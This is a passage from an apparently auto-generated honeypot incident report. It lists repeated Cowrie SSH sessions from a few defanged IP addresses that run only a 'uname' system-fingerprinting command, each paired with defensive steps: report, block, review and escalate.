| `2026-08-16 18:49:21` | `cowrie.login.success` |
| `2026-08-16 18:49:22` | `cowrie.session.params` |
| `2026-08-16 18:49:22` | `cowrie.command.input` |
| `2026-08-16 18:49:22` | `cowrie.log.closed` |
| `2026-08-16 18:49:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f05470970b1

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:49 |
| **Last Seen** | 2026-08-16 18:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:49:26` | `cowrie.session.connect` |
| `2026-08-16 18:49:26` | `cowrie.client.version` |
| `2026-08-16 18:49:27` | `cowrie.client.kex` |
| `2026-08-16 18:49:27` | `cowrie.login.success` |
| `2026-08-16 18:49:28` | `cowrie.session.params` |
| `2026-08-16 18:49:28` | `cowrie.command.input` |
| `2026-08-16 18:49:28` | `cowrie.log.closed` |
| `2026-08-16 18:49:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56e2b1d1d932

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:49 |
| **Last Seen** | 2026-08-16 18:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:49:32` | `cowrie.session.connect` |
| `2026-08-16 18:49:32` | `cowrie.client.version` |
| `2026-08-16 18:49:32` | `cowrie.client.kex` |
| `2026-08-16 18:49:32` | `cowrie.login.success` |
| `2026-08-16 18:49:33` | `cowrie.session.params` |
| `2026-08-16 18:49:33` | `cowrie.command.input` |
| `2026-08-16 18:49:33` | `cowrie.log.closed` |
| `2026-08-16 18:49:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce3b39ef0506

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:49 |
| **Last Seen** | 2026-08-16 18:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:49:37` | `cowrie.session.connect` |
| `2026-08-16 18:49:37` | `cowrie.client.version` |
| `2026-08-16 18:49:37` | `cowrie.client.kex` |
| `2026-08-16 18:49:37` | `cowrie.login.success` |
| `2026-08-16 18:49:38` | `cowrie.session.params` |
| `2026-08-16 18:49:38` | `cowrie.command.input` |
| `2026-08-16 18:49:38` | `cowrie.log.closed` |
| `2026-08-16 18:49:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f11ad227e34f

| Field | Detail |
|---|---|
| **Source IP** | `172.239.64[.]86` |
| **First Seen** | 2026-08-16 18:49 |
| **Last Seen** | 2026-08-16 18:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0[.]0 Safari/537.36, Accept: */*, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:49:38` | `cowrie.session.connect` |
| `2026-08-16 18:49:38` | `cowrie.login.success` |
| `2026-08-16 18:49:39` | `cowrie.session.params` |
| `2026-08-16 18:49:39` | `cowrie.command.input` |
| `2026-08-16 18:49:39` | `cowrie.command.input` |
| `2026-08-16 18:49:39` | `cowrie.command.failed` |
| `2026-08-16 18:49:39` | `cowrie.command.input` |
| `2026-08-16 18:49:39` | `cowrie.command.failed` |
| `2026-08-16 18:49:39` | `cowrie.command.input` |
| `2026-08-16 18:49:39` | `cowrie.log.closed` |
| `2026-08-16 18:49:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.239.64[.]86` to AbuseIPDB if not already reported
- [ ] Block `172.239.64[.]86` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a304e82da420

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:49 |
| **Last Seen** | 2026-08-16 18:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:49:42` | `cowrie.session.connect` |
| `2026-08-16 18:49:42` | `cowrie.client.version` |
| `2026-08-16 18:49:42` | `cowrie.client.kex` |
| `2026-08-16 18:49:43` | `cowrie.login.success` |
| `2026-08-16 18:49:43` | `cowrie.session.params` |
| `2026-08-16 18:49:43` | `cowrie.command.input` |
| `2026-08-16 18:49:43` | `cowrie.log.closed` |
| `2026-08-16 18:49:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cac6bea6477d

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:49 |
| **Last Seen** | 2026-08-16 18:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:49:47` | `cowrie.session.connect` |
| `2026-08-16 18:49:47` | `cowrie.client.version` |
| `2026-08-16 18:49:47` | `cowrie.client.kex` |
| `2026-08-16 18:49:48` | `cowrie.login.success` |
| `2026-08-16 18:49:49` | `cowrie.session.params` |
| `2026-08-16 18:49:49` | `cowrie.command.input` |
| `2026-08-16 18:49:49` | `cowrie.log.closed` |
| `2026-08-16 18:49:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-026a4e05958e

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:49 |
| **Last Seen** | 2026-08-16 18:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:49:52` | `cowrie.session.connect` |
| `2026-08-16 18:49:52` | `cowrie.client.version` |
| `2026-08-16 18:49:52` | `cowrie.client.kex` |
| `2026-08-16 18:49:53` | `cowrie.login.success` |
| `2026-08-16 18:49:54` | `cowrie.session.params` |
| `2026-08-16 18:49:54` | `cowrie.command.input` |
| `2026-08-16 18:49:54` | `cowrie.log.closed` |
| `2026-08-16 18:49:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8050337a5812

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:49 |
| **Last Seen** | 2026-08-16 18:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:49:58` | `cowrie.session.connect` |
| `2026-08-16 18:49:58` | `cowrie.client.version` |
| `2026-08-16 18:49:58` | `cowrie.client.kex` |
| `2026-08-16 18:49:58` | `cowrie.login.success` |
| `2026-08-16 18:49:59` | `cowrie.session.params` |
| `2026-08-16 18:49:59` | `cowrie.command.input` |
| `2026-08-16 18:49:59` | `cowrie.log.closed` |
| `2026-08-16 18:49:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb534320a059

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:50 |
| **Last Seen** | 2026-08-16 18:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:50:03` | `cowrie.session.connect` |
| `2026-08-16 18:50:03` | `cowrie.client.version` |
| `2026-08-16 18:50:03` | `cowrie.client.kex` |
| `2026-08-16 18:50:03` | `cowrie.login.success` |
| `2026-08-16 18:50:04` | `cowrie.session.params` |
| `2026-08-16 18:50:04` | `cowrie.command.input` |
| `2026-08-16 18:50:04` | `cowrie.log.closed` |
| `2026-08-16 18:50:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f056db23827c

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:50 |
| **Last Seen** | 2026-08-16 18:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:50:08` | `cowrie.session.connect` |
| `2026-08-16 18:50:08` | `cowrie.client.version` |
| `2026-08-16 18:50:08` | `cowrie.client.kex` |
| `2026-08-16 18:50:08` | `cowrie.login.success` |
| `2026-08-16 18:50:09` | `cowrie.session.params` |
| `2026-08-16 18:50:09` | `cowrie.command.input` |
| `2026-08-16 18:50:09` | `cowrie.log.closed` |
| `2026-08-16 18:50:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4aed75e0e148

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:50 |
| **Last Seen** | 2026-08-16 18:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:50:14` | `cowrie.session.connect` |
| `2026-08-16 18:50:14` | `cowrie.client.version` |
| `2026-08-16 18:50:14` | `cowrie.client.kex` |
| `2026-08-16 18:50:14` | `cowrie.login.success` |
| `2026-08-16 18:50:15` | `cowrie.session.params` |
| `2026-08-16 18:50:15` | `cowrie.command.input` |
| `2026-08-16 18:50:15` | `cowrie.log.closed` |
| `2026-08-16 18:50:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e63f0ce891a5

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:50 |
| **Last Seen** | 2026-08-16 18:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:50:19` | `cowrie.session.connect` |
| `2026-08-16 18:50:19` | `cowrie.client.version` |
| `2026-08-16 18:50:19` | `cowrie.client.kex` |
| `2026-08-16 18:50:20` | `cowrie.login.success` |
| `2026-08-16 18:50:21` | `cowrie.session.params` |
| `2026-08-16 18:50:21` | `cowrie.command.input` |
| `2026-08-16 18:50:21` | `cowrie.log.closed` |
| `2026-08-16 18:50:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f94bc4e9aedf

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:50 |
| **Last Seen** | 2026-08-16 18:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:50:25` | `cowrie.session.connect` |
| `2026-08-16 18:50:25` | `cowrie.client.version` |
| `2026-08-16 18:50:25` | `cowrie.client.kex` |
| `2026-08-16 18:50:25` | `cowrie.login.success` |
| `2026-08-16 18:50:26` | `cowrie.session.params` |
| `2026-08-16 18:50:26` | `cowrie.command.input` |
| `2026-08-16 18:50:26` | `cowrie.log.closed` |
| `2026-08-16 18:50:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d68432338c5

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:50 |
| **Last Seen** | 2026-08-16 18:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:50:30` | `cowrie.session.connect` |
| `2026-08-16 18:50:30` | `cowrie.client.version` |
| `2026-08-16 18:50:30` | `cowrie.client.kex` |
| `2026-08-16 18:50:30` | `cowrie.login.success` |
| `2026-08-16 18:50:31` | `cowrie.session.params` |
| `2026-08-16 18:50:31` | `cowrie.command.input` |
| `2026-08-16 18:50:31` | `cowrie.log.closed` |
| `2026-08-16 18:50:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8951a599390d

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]26` |
| **First Seen** | 2026-08-16 18:50 |
| **Last Seen** | 2026-08-16 18:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:50:31` | `cowrie.session.connect` |
| `2026-08-16 18:50:31` | `cowrie.client.version` |
| `2026-08-16 18:50:31` | `cowrie.client.kex` |
| `2026-08-16 18:50:32` | `cowrie.login.success` |
| `2026-08-16 18:50:32` | `cowrie.session.params` |
| `2026-08-16 18:50:32` | `cowrie.command.input` |
| `2026-08-16 18:50:33` | `cowrie.log.closed` |
| `2026-08-16 18:50:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]26` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8d8ebf03772

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:50 |
| **Last Seen** | 2026-08-16 18:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:50:36` | `cowrie.session.connect` |
| `2026-08-16 18:50:36` | `cowrie.client.version` |
| `2026-08-16 18:50:36` | `cowrie.client.kex` |
| `2026-08-16 18:50:36` | `cowrie.login.success` |
| `2026-08-16 18:50:37` | `cowrie.session.params` |
| `2026-08-16 18:50:37` | `cowrie.command.input` |
| `2026-08-16 18:50:37` | `cowrie.log.closed` |
| `2026-08-16 18:50:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8db55a048be

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:50 |
| **Last Seen** | 2026-08-16 18:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:50:41` | `cowrie.session.connect` |
| `2026-08-16 18:50:41` | `cowrie.client.version` |
| `2026-08-16 18:50:41` | `cowrie.client.kex` |
| `2026-08-16 18:50:41` | `cowrie.login.success` |
| `2026-08-16 18:50:42` | `cowrie.session.params` |
| `2026-08-16 18:50:42` | `cowrie.command.input` |
| `2026-08-16 18:50:42` | `cowrie.log.closed` |
| `2026-08-16 18:50:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea7b370772df

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:50 |
| **Last Seen** | 2026-08-16 18:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:50:46` | `cowrie.session.connect` |
| `2026-08-16 18:50:46` | `cowrie.client.version` |
| `2026-08-16 18:50:46` | `cowrie.client.kex` |
| `2026-08-16 18:50:47` | `cowrie.login.success` |
| `2026-08-16 18:50:48` | `cowrie.session.params` |
| `2026-08-16 18:50:48` | `cowrie.command.input` |
| `2026-08-16 18:50:49` | `cowrie.log.closed` |
| `2026-08-16 18:50:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1ad3b790a3a

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:50 |
| **Last Seen** | 2026-08-16 18:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:50:52` | `cowrie.session.connect` |
| `2026-08-16 18:50:52` | `cowrie.client.version` |
| `2026-08-16 18:50:52` | `cowrie.client.kex` |
| `2026-08-16 18:50:52` | `cowrie.login.success` |
| `2026-08-16 18:50:53` | `cowrie.session.params` |
| `2026-08-16 18:50:53` | `cowrie.command.input` |
| `2026-08-16 18:50:53` | `cowrie.log.closed` |
| `2026-08-16 18:50:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3285770fa38b

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:50 |
| **Last Seen** | 2026-08-16 18:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:50:57` | `cowrie.session.connect` |
| `2026-08-16 18:50:57` | `cowrie.client.version` |
| `2026-08-16 18:50:57` | `cowrie.client.kex` |
| `2026-08-16 18:50:57` | `cowrie.login.success` |
| `2026-08-16 18:50:58` | `cowrie.session.params` |
| `2026-08-16 18:50:58` | `cowrie.command.input` |
| `2026-08-16 18:50:58` | `cowrie.log.closed` |
| `2026-08-16 18:50:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b481abd1baa

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:51 |
| **Last Seen** | 2026-08-16 18:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:51:02` | `cowrie.session.connect` |
| `2026-08-16 18:51:02` | `cowrie.client.version` |
| `2026-08-16 18:51:03` | `cowrie.client.kex` |
| `2026-08-16 18:51:03` | `cowrie.login.success` |
| `2026-08-16 18:51:04` | `cowrie.session.params` |
| `2026-08-16 18:51:04` | `cowrie.command.input` |
| `2026-08-16 18:51:04` | `cowrie.log.closed` |
| `2026-08-16 18:51:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62b7d926b21b

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:51 |
| **Last Seen** | 2026-08-16 18:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:51:08` | `cowrie.session.connect` |
| `2026-08-16 18:51:08` | `cowrie.client.version` |
| `2026-08-16 18:51:08` | `cowrie.client.kex` |
| `2026-08-16 18:51:08` | `cowrie.login.success` |
| `2026-08-16 18:51:09` | `cowrie.session.params` |
| `2026-08-16 18:51:09` | `cowrie.command.input` |
| `2026-08-16 18:51:09` | `cowrie.log.closed` |
| `2026-08-16 18:51:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-279ece04ac7c

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:51 |
| **Last Seen** | 2026-08-16 18:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:51:13` | `cowrie.session.connect` |
| `2026-08-16 18:51:13` | `cowrie.client.version` |
| `2026-08-16 18:51:13` | `cowrie.client.kex` |
| `2026-08-16 18:51:13` | `cowrie.login.success` |
| `2026-08-16 18:51:14` | `cowrie.session.params` |
| `2026-08-16 18:51:14` | `cowrie.command.input` |
| `2026-08-16 18:51:14` | `cowrie.log.closed` |
| `2026-08-16 18:51:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b478548b77a

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:51 |
| **Last Seen** | 2026-08-16 18:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:51:18` | `cowrie.session.connect` |
| `2026-08-16 18:51:18` | `cowrie.client.version` |
| `2026-08-16 18:51:18` | `cowrie.client.kex` |
| `2026-08-16 18:51:19` | `cowrie.login.success` |
| `2026-08-16 18:51:19` | `cowrie.session.params` |
| `2026-08-16 18:51:19` | `cowrie.command.input` |
| `2026-08-16 18:51:19` | `cowrie.log.closed` |
| `2026-08-16 18:51:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26f19bcb3ef7

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]241` |
| **First Seen** | 2026-08-16 18:51 |
| **Last Seen** | 2026-08-16 18:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 18:51:24` | `cowrie.session.connect` |
| `2026-08-16 18:51:24` | `cowrie.client.version` |
| `2026-08-16 18:51:24` | `cowrie.client.kex` |
| `2026-08-16 18:51:24` | `cowrie.login.success` |
| `2026-08-16 18:51:25` | `cowrie.session.params` |
| `2026-08-16 18:51:25` | `cowrie.command.input` |
| `2026-08-16 18:51:25` | `cowrie.log.closed` |
| `2026-08-16 18:51:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]241` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]241` at perimeter firewall / security group
